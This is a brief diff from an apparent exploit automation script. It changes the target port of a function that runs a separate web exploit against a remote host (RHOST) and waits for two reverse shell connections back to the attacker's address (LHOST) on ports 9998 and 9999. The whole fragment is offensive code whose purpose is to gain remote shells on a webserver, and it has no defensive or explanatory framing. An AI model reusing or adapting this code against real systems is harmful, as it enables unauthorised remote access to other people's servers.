@@ -37,9 +37,9 @@ except:
 
 def web_exploit(shell1, shell2):
     print("[!] triggering revshell connections on webserver")
-    system(f"python web_exploit.py http://{RHOST}:5000 {LHOST} 9998")
+    system(f"python web_exploit.py http://{RHOST}:8888 {LHOST} 9998")
     conn2 = shell2.wait_for_connection()
-    system(f"python web_exploit.py http://{RHOST}:5000 {LHOST} 9999")
+    system(f"python web_exploit.py http://{RHOST}:8888 {LHOST} 9999")
     conn1 = shell1.wait_for_connection()
     return conn1, conn2
 
